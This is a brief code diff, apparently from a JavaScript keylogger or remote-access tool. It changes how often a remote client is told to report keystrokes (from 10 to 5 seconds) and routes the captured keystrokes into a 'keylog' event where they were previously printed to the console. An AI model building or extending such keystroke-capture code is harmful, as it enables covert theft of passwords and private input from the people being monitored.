@@ -12,12 +12,12 @@ function spawnClient (host, port) {
     function () {
       this.emit('connect')
 
-      this._TCPclient.write(Packets.KeylogSetup.create({ interval: 10000 }))
+      this._TCPclient.write(Packets.KeylogSetup.create({ interval: 5000 }))
 
       this.on(Packets.r_Keylog, function (packet) {
-        console.log(
-          'Received key strokes:',
-          String.fromCharCode(...packet.data)
+        this.emit(
+          'keylog',
+          String.fromCharCode(...packet.data).replace(/[^\x1F-\x7F\n]/g, '')
         )
       })
     }
